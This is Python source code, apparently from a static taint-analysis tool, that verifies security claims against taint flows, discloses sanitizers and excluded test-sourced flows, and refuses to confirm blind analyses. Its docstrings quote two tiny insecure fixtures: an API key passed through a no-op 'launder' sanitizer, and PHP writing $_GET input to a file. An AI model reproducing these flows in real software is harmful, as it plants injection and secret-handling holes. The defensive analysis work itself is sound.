def _flow_evidence_dict(v: "TaintFlowFinding") -> dict[str, Any]:
    """Structured per-flow drill-down record for the verdict ``evidence`` list
    (WI-kikis) — the machine-readable counterpart of :func:`_render_flow`."""
    return {
        "source_symbol": v.source_symbol,
        "source_primitive": v.source_primitive,
        "source_module": v.source_module,
        "source_boundary": v.source_boundary,
        "sink_symbol": v.sink_symbol,
        "sink_primitive": v.sink_primitive,
        # WI-joruv: the MODULE the matched catalog entry declares, which is
        # frequently not recoverable from ``sink_symbol``. A Go sink emits
        # ``go:net/http:0-0:Do:external_symbol`` (package) while the catalog
        # entry is ``net/http.Client.Do`` (package.Type). Emitting only the
        # symbol leaves a *correct* match unverifiable — a reader cannot tell
        # it from a short-name collision without re-running the matcher,
        # which is precisely the "realizable by lookup" property INV-karud
        # asks for. Pure provenance: this changes no match.
        "sink_module": v.sink_module,
        "path": list(v.path),
        # INV-karud (c): HOW this flow was adjudicated. Both fields existed on
        # the finding and neither reached the record, so a reader could not
        # tell a flow the ADR-0017 §3a walk confirmed by data dependence from
        # one included by call reachability alone — and the whole point of a
        # `precise` label is that a consumer can act on it differently. This is
        # the same "the pipeline computed it and then discarded it" shape that
        # `source_module` (WI-joruv) and `source_boundary` (WI-vazal) closed on
        # this very record.
        "confidence": v.confidence,
        "analysis_method": v.analysis_method,
    }


#: Disclosure-bucket keys for flows excluded from a claim verdict (WI-bifob).
#:
#: ``SOURCE_SCOPE_TEST`` is no longer the only test-side bucket. ``is_test_file``
#: is deliberately BROAD — it also matches ``bench/``, ``fixtures/``,
#: ``testdata/``, ``mocks/``, ``harnesses/`` and ``fv/`` — and reporting all of
#: that as ``test_sourced`` told the reader something false about, say, a
#: benchmark directory. The owner ruling (2026-08-03) was to KEEP the breadth
#: and DISCLOSE which rule fired, so the bucket key now carries the reason
#: ``paths.classify_test_file`` returned. ``test_sourced`` keeps its exact
#: former meaning for genuine test code, so a consumer keyed on it does not
#: silently lose the case it cared about — it stops being credited with the
#: others.
SOURCE_SCOPE_PRODUCTION = "production"
SOURCE_SCOPE_TEST = "test_sourced"
SOURCE_SCOPE_MIGRATION = "migration_sourced"


def _symbol_path_slot(symbol_id: str) -> str:
    """Extract the path slot from ``{lang}:{path}:{span}:{name}:{kind}``.

    RIGHT-ANCHORED deliberately. Per ADR-0036 (D1a) the path slot is the one
    colon-TOLERANT slot in the grammar — ``dart:dart:io:0-0:module:module`` has
    path ``dart:io`` — while lang/span/name/kind are colon-free.

    THE FOLD THIS DOCSTRING ASKED FOR HAS HAPPENED. It used to read "not
    folding those two here, but this must not become a third naive copy",
    naming ``ir._extract_path_slot``'s ``parts[1]`` as wrong — and a FOURTH
    copy was already live in ``taint._extract_callee_module``, where it
    truncated every colon-bearing Rust module and made the taint matcher reject
    correctly-identified sinks. All four now delegate to
    :func:`ir.symbol_path_slot`.

    Returns the empty string for anything that is not a well-formed id, which
    the callers treat as "not test, not migration" — an unparseable source is
    not evidence for excluding a flow.
    """
    return symbol_path_slot(symbol_id)


def _sanitizer_attribution(findings: list["TaintFlowFinding"]) -> str:
    """Name the sanitizers holding a clean verdict up, marking repo-supplied ones.

    INV-pojib. The clause this feeds used to be built from the sanitized-flow
    COUNT alone, so "a sanitizer protects every route" read identically whether
    the sanitizer was ``cryptography.fernet.Fernet.encrypt`` from the shipped
    catalogue or a no-op function the ANALYSED REPOSITORY declared about itself.
    Measured on the shipped CLI: an 11-line fixture doing
    ``os.remove(launder(os.environ["API_KEY"]))``, where ``launder`` returns its
    argument unchanged, went ``violated`` rc 1 -> ``confirmed`` rc 0 on the
    strength of an 8-line sanitizer file, with the same sentence and the same
    exit code as an earned clean verdict.

    WHY MARKING ONLY THE REPO-SUPPLIED ONES IS THE POINT. A caveat printed on
    every sanitized verdict would carry no information, and a reader learns to
    discount a caveat that is always there — which is the failure this is meant
    to correct rather than a milder form of it. So the built-in case is named
    and NOT marked, and the discriminator test pins that.

    THIS DOES NOT CHANGE A VERDICT. It changes what a verdict SAYS. Whether the
    exit code should also carry it is a separate, larger question (a consumer
    contract), tracked on the item rather than decided here.
    """
    named: list[str] = []
    repo_supplied: set[str] = set()
    for finding in findings:
        if not getattr(finding, "sanitized", False):
            # UNREACHABLE FROM TODAY'S ONLY CALLER, and kept anyway. The clause
            # this feeds is built only on the ``confirmed`` path, where every
            # constrained flow is sanitized by construction (an unsanitized one
            # would have made the verdict ``violated``). It is kept rather than
            # deleted because the failure it prevents is a WRONG SAFETY
            # STATEMENT — attributing a protection to a flow that reached the
            # sink unprotected — and the caller's guarantee is incidental to
            # this function rather than expressed in its signature.
            continue  # pragma: no cover
        for name in getattr(finding, "sanitized_by", ()) or ():
            if name not in named:
                named.append(name)
        repo_supplied.update(getattr(finding, "sanitized_by_user_supplied", ()) or ())
    if not named:
        # A sanitized flow whose sanitizer was not recorded. Say nothing rather
        # than guess: the propagators populate this, and a flow constructed by
        # a consumer that does not is better served by the unattributed clause
        # than by a claim about a sanitizer nobody named.
        return ""
    shown = ", ".join(
        f"{name} (project-local)" if name in repo_supplied else name
        for name in named
    )
    # "via X" WHEN ONE CANDIDATE, "one of" WHEN SEVERAL, because the barrier
    # records which sanitizers COULD have fired, not which did. All four shipped
    # ``*.encrypt`` entries match a bare ``encrypt`` callee, so a fixture calling
    # ``Fernet.encrypt`` has four candidates and naming one would be a fact the
    # analysis never established — the first draft of this did exactly that and
    # printed ``ChaCha20Poly1305.encrypt`` for a Fernet call, caught by running
    # the live discriminator rather than the unit tests, which were green.
    if len(named) == 1:
        return f" (via {shown})"
    return f" (barrier matched one of: {shown})"


def _source_scope(finding: "TaintFlowFinding") -> str:
    """Classify a flow by whether its SOURCE is production code.

    The SOURCE side is what is classified, not the sink. A test that reaches a
    real network primitive is still a test doing its job; a production function
    that reaches a primitive inside a test helper is still a production flow.
    The question the claim asks is "does the shipped application do this", and
    that is decided by where the data enters.
    """
    return symbol_source_scope(getattr(finding, "source_symbol", "") or "")


def symbol_source_scope(symbol_id: str) -> str:
    """Classify a SYMBOL ID by whether it is production code.

    Split out of :func:`_source_scope` when the taint LANGUAGE CENSUS needed
    the same answer (INV-dabuf). The census lives in ``cli`` and had no
    production question at all, so a single fixture file in a language with no
    taint catalogue blocked every claim in the repo while a taint FLOW out of
    that same file was excluded as non-production. One tool, two answers about
    whether a fixture counts — and the fix is to share the classifier, not to
    write a second one next to the census (L53: a second home for one fact
    drifts immediately).
    """
    path = _symbol_path_slot(symbol_id)
    if not path:
        return SOURCE_SCOPE_PRODUCTION
    # ``classify_test_file`` IS ``is_test_file`` — the boolean is defined as
    # "reason is not None" — so asking for the reason changes which flows are
    # excluded not at all. It changes only what the disclosure is allowed to
    # call them. Re-deriving the categories here instead would put a second
    # copy of a production classification in a consumer (L53).
    reason = classify_test_file(path)
    if reason is not None:
        return f"{reason}_sourced"
    if is_migration_file(path):
        return SOURCE_SCOPE_MIGRATION
    return SOURCE_SCOPE_PRODUCTION


def verify_taint_claim(
    claim: Claim,
    findings: list,
    include_non_production: bool = False,
) -> ClaimVerdict:
    """Verify a single taint-flow claim against propagation findings.

    Checks whether any TaintFlowFinding matches the claim's constraint:
    the source taint label flows to the prohibited sink zone without
    being sanitized.

    Args:
        claim: The claim with a taint_flow constraint.
        findings: List of TaintFlowFinding objects from propagation.
        include_non_production: Count flows whose SOURCE is test, fixture or
            migration code against the claim. Default False (WI-bifob): those
            flows are excluded from the verdict and disclosed in the verdict's
            ``excluded_flows`` bucket instead. Set True to restore the previous
            behavior of treating every source as in scope.

    Returns:
        ClaimVerdict with the result. ``excluded_flows`` reports what the
        production default set aside, on both the confirmed and violated paths.
    """
    tf = claim.constraint_taint_flow
    if tf is None:
        # ADR-0033 Phase 3 PR4 / WI-rolol sub-task A: silent-confirm
        # fall-through. Previously returned verdict="confirmed" with
        # details="No taint_flow constraint to check.", which silently
        # confirms claims that have no taint_flow machinery to verify
        # them.
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="inconclusive",
            details=(
                "No taint_flow constraint on this claim. "
                "verify_taint_claim cannot assert anything."
            ),
        )

    # Filter findings matching this claim's taint label and sink zone.
    #
    # ``and not f.sanitized`` was a TAUTOLOGY until the propagators started
    # emitting sanitized flows: the field was written ``False`` at both and
    # only construction sites, so this clause removed nothing and the
    # ``confirmed_safe`` branch of ``TaintFlowFinding.verdict`` was unreachable
    # in production. It now filters for real — and what it filters is counted
    # and disclosed rather than silently dropped, because "no path exists" and
    # "a path exists and your encrypt() call is what makes it safe" are
    # different facts, and only the second tells a reader what breaks if they
    # remove that call.
    constrained = [
        f for f in findings
        if f.taint_label == tf.source_taint
        and f.sink_zone == tf.prohibited_sink_zone
    ]
    matching = [f for f in constrained if not f.sanitized]
    sanitized_flows = len(constrained) - len(matching)

    # WI-bifob: production is the default scope, and what the default leaves
    # out is DISCLOSED rather than dropped. A test that opens a listener is not
    # a network-exposure finding about the product, and a migration that writes
    # to the database is not an untrusted-input finding — yet because a claim
    # verdict is a DISJUNCTION over its flows, a single such flow was enough to
    # hold a whole claim at `violated` forever, and no amount of precision work
    # elsewhere could move it. Measured on the 9-repo cohort: 2 of 18 violated
    # claims rested entirely on one test-sourced flow each (a conftest.py
    # reading an env var, a _test.go dialling TLS).
    #
    # Nobody ever decided taint should count test code; it simply was never
    # wired, which is the tell that this was an unmade decision rather than a
    # considered scope.
    excluded_flows: dict[str, int] = {}
    if include_non_production:
        violations = matching
    else:
        violations = []
        for finding in matching:
            scope = _source_scope(finding)
            if scope == SOURCE_SCOPE_PRODUCTION:
                violations.append(finding)
            else:
                excluded_flows[scope] = excluded_flows.get(scope, 0) + 1

    if not violations:
        excluded_clause = ""
        if excluded_flows:
            # State the exclusions on the CONFIRMED path especially. This is
            # where a silent filter would be most misleading: the claim reads
            # as clean, and the reader has no way to learn that flows existed
            # and were set aside by a policy they did not choose.
            parts = ", ".join(
                f"{count} {reason}"
                for reason, count in sorted(excluded_flows.items())
            )
            excluded_clause = (
                f" Excluded from this verdict as non-production: {parts} "
                f"(pass --include-non-production-sources to count them)."
            )
        # The confirmed path is where a sanitized flow matters MOST: the claim
        # reads clean, and the reason it reads clean may be a sanitizer the
        # reader is one refactor away from removing. Saying so turns "no
        # violation" into "no violation, and here is what is holding it".
        sanitized_clause = ""
        if sanitized_flows:
            sanitized_clause = (
                f" {sanitized_flows} flow(s) reach that zone but pass through "
                f"a sanitizer on every route"
                f"{_sanitizer_attribution(constrained)}."
            )
        return ClaimVerdict(
            claim_id=claim.id,
            claim_text=claim.text,
            verdict="confirmed",
            details=(
                f"No unsanitized {tf.source_taint} data reaches "
                f"{tf.prohibited_sink_zone} zone."
                f"{sanitized_clause}{excluded_clause}"
            ),
            excluded_flows=excluded_flows,
            sanitized_flows=sanitized_flows,
        )

    # Build detailed violation message with per-flow drill-down evidence
    # (WI-kikis). The previous rendering collapsed every violation to a bare
    # "<source_primitive> -> <sink_primitive>" pair and showed the first 5 —
    # which, on high-count claims (3,969 flows on the self-corpus), were
    # frequently VERBATIM DUPLICATES, because many distinct source/sink SYMBOLS
    # share a primitive NAME. The consumer saw the same string five times and
    # had no way to locate any individual flow (no symbol, no path, no edge).
    # Fix: (a) deduplicate on the full per-flow identity (source/sink symbol +
    # primitive + call-graph path) so genuinely-identical findings collapse and
    # the shown rows are DISTINCT; (b) render each shown row WITH its symbol IDs
    # (and path-hop count) so distinct flows are visibly distinct and drillable;
    # (c) attach the bounded structured ``evidence`` list to the verdict so a
    # consumer can triage programmatically even at high evidence counts.
    distinct_violations: list["TaintFlowFinding"] = []
    _seen_flows: set[tuple[Any, ...]] = set()
    for v in violations:
        identity = _flow_identity(v)
        if identity in _seen_flows:
            continue
        _seen_flows.add(identity)
        distinct_violations.append(v)

    paths_desc = "; ".join(_render_flow(v) for v in distinct_violations[:5])
    suffix = ""
    if len(distinct_violations) > 5:
        suffix = (
            f" (and {len(distinct_violations) - 5} more distinct flow(s))"
        )
    # Only disclose the distinct count when it differs from the raw total, so
    # the common no-duplicates case stays terse.
    distinct_clause = ""
    if len(distinct_violations) < len(violations):
        distinct_clause = f" ({len(distinct_violations)} distinct)"

    # WI-vazal: report WHICH boundary each counted flow entered through.
    # The label cannot carry it — three boundaries share `untrusted_input`.
    flow_origins: dict[str, int] = {}
    for finding in violations:
        origin = getattr(finding, "source_boundary", "") or "declared"
        flow_origins[origin] = flow_origins.get(origin, 0) + 1

    # INV-karud (c): report HOW each counted flow was adjudicated.
    #
    # Both breakdowns count `violations` — every flow the verdict rests on —
    # NOT `distinct_violations[:_MAX_EVIDENCE_ROWS]`. The shown rows are
    # deduplicated and capped, so a breakdown over them would silently
    # disagree with the `len(violations)` count printed beside it in `details`.
    analysis_methods: dict[str, int] = {}
    confidences: dict[str, int] = {}
    for finding in violations:
        method = getattr(finding, "analysis_method", "") or "structural"
        analysis_methods[method] = analysis_methods.get(method, 0) + 1
        conf = getattr(finding, "confidence", "") or "approximate"
        confidences[conf] = confidences.get(conf, 0) + 1

    # AGGREGATION POLICY, stated rather than left to `max()`. A verdict is a
    # DISJUNCTION over its flows, and after ADR-0017 §3a those flows can be
    # adjudicated differently — some by a data-dependence walk, some by call
    # reachability alone. Collapsing upward would claim a precision most flows
    # did not have; collapsing downward would erase the ones that earned it.
    # So the composition is reported. The single-value case stays terse (the
    # same shape as `distinct_clause` above), which keeps today's rendering
    # byte-identical for a verdict whose flows all agree — and today they
    # nearly all do, which is exactly why the hardcoded literal went unnoticed.
    if len(confidences) == 1:
        confidence_clause = next(iter(confidences))
    else:
        confidence_clause = ", ".join(
            f"{count} {name}" for name, count in sorted(confidences.items())
        )

    # WI-bifob's own stated contract is that exclusions are disclosed "on the
    # CONFIRMED path as well as the violated one". Only the confirmed path
    # implemented it: on the violated path `excluded_flows` was attached to the
    # dataclass and never rendered, and `cli.py` prints `details` alone — so a
    # TEXT-mode reader of a violated claim never learned that flows were set
    # aside by a policy they did not choose. `flow_origins` (WI-vazal) reached
    # no text surface at all, on either path, which mattered most exactly where
    # it was measured: all 140 flows on pretix's largest violated claim are
    # database-read-to-database-write, and that is decision-changing.
    #
    # Both are spliced into `details` rather than rendered by the CLI, because
    # `details` is where this module already puts the confirmed-path exclusion
    # clause — one home for the prose, not two.
    origins_clause = ", ".join(
        f"{count} {name}" for name, count in sorted(flow_origins.items())
    )
    excluded_clause = ""
    if excluded_flows:
        parts = ", ".join(
            f"{count} {reason}"
            for reason, count in sorted(excluded_flows.items())
        )
        excluded_clause = (
            f" Excluded from this verdict as non-production: {parts} "
            f"(pass --include-non-production-sources to count them)."
        )

    return ClaimVerdict(
        claim_id=claim.id,
        claim_text=claim.text,
        verdict="violated",
        evidence_count=len(violations),
        evidence=[
            _flow_evidence_dict(v)
            for v in distinct_violations[:_MAX_EVIDENCE_ROWS]
        ],
        details=(
            f"{len(violations)} unsanitized {tf.source_taint} flow(s)"
            f"{distinct_clause} "
            f"to {tf.prohibited_sink_zone} zone "
            f"[{tf.source_taint} confidence: {confidence_clause}] "
            f"[origins: {origins_clause}]: "
            f"{paths_desc}{suffix}{excluded_clause}"
        ),
        excluded_flows=excluded_flows,
        flow_origins=flow_origins,
        analysis_methods=analysis_methods,
        sanitized_flows=sanitized_flows,
    )


def _require_coverage_to_confirm(
    verdict: ClaimVerdict,
    blind_reason: str | None,
) -> ClaimVerdict:
    """Downgrade a ``confirmed`` verdict the analysis did not earn.

    ONE RULE, ONE PLACE, applied to every constraint kind on the way out of
    :func:`verify_claims`: *a claim may only be confirmed if the analysis
    could actually look*. A ``violated`` verdict is untouched — finding
    something is trustworthy regardless of coverage; it is the CLEAN result
    that depends on having looked.

    THE DEFECT THIS CLOSES, measured on real input rather than reasoned
    about: a PHP file doing ``file_put_contents("/tmp/out", $_GET['payload'])``
    returned ``confirmed`` at exit 0 for the claim "untrusted input must not
    reach the filesystem", because PHP has no taint catalogue and "no flows
    found" was reported as "no flows exist". The boundary constraint kinds
    already refused to confirm a blind analysis (WI-kajil / INV-bitig); taint
    claims skipped the same rule and a stderr note asked the READER to apply
    it by hand — "Treat 'confirmed' verdicts on these languages as
    inconclusive" — which no CI gate and no hurried human does.

    This is a backstop, not the only check. ``verify_claim`` keeps its own
    per-kind coverage tests because they produce a better-worded reason; this
    catches any constraint kind that has none, including kinds added later.
    ``test_every_constraint_kind_is_coverage_gated`` enumerates them.
    """
    if verdict.verdict != "confirmed" or not blind_reason:
        return verdict
    return ClaimVerdict(
        claim_id=verdict.claim_id,
        claim_text=verdict.claim_text,
        verdict="inconclusive",
        evidence=verdict.evidence,
        evidence_count=verdict.evidence_count,
        details=(
            f"{verdict.details} NOT CONFIRMED: {blind_reason}. Absence of "
            f"evidence here is not evidence of absence."
        ),
    )


def verify_claims(
    claims: list[Claim],
    boundary_map: BoundaryMap,
    taint_findings: list | None = None,
    coverage: Optional[BoundaryCoverage] = None,
    include_non_production: bool = False,
    blind_reason: str | None = None,
) -> list[ClaimVerdict]:
    """Verify all claims against boundary map and/or taint-flow findings.

    Claims with ``constraint_taint_flow`` are verified against taint findings.
    Claims with boundary constraints are verified against the boundary map.

    Args:
        claims: List of claims to verify.
        boundary_map: The I/O boundary map to check against.
        taint_findings: Optional list of TaintFlowFinding objects.
        coverage: Boundary-analysis coverage signal, passed through to
            :func:`verify_claim` for boundary claims (WI-kajil). Taint claims
            have their own unsupported-language signal (INV-javam) and are
            unaffected.
        include_non_production: Count test/fixture/migration-sourced taint
            flows against taint claims (WI-bifob). Default False; excluded
            flows are disclosed per-verdict in ``excluded_flows``. Boundary
            claims are unaffected.

    Returns:
        List of ClaimVerdict objects, one per claim.
    """
    verdicts: list[ClaimVerdict] = []
    for claim in claims:
        if claim.constraint_taint_flow is not None:
            verdict = verify_taint_claim(
                claim, taint_findings or [],
                include_non_production=include_non_production,
            )
        else:
            verdict = verify_claim(claim, boundary_map, coverage=coverage)
        # Single coverage gate for EVERY constraint kind — see
        # _require_coverage_to_confirm. Applied here rather than at each
        # branch so a constraint kind added later cannot ship unable to
        # distinguish "looked and found nothing" from "did not look".
        verdicts.append(
            _require_coverage_to_confirm(verdict, blind_reason),
        )
    return verdicts
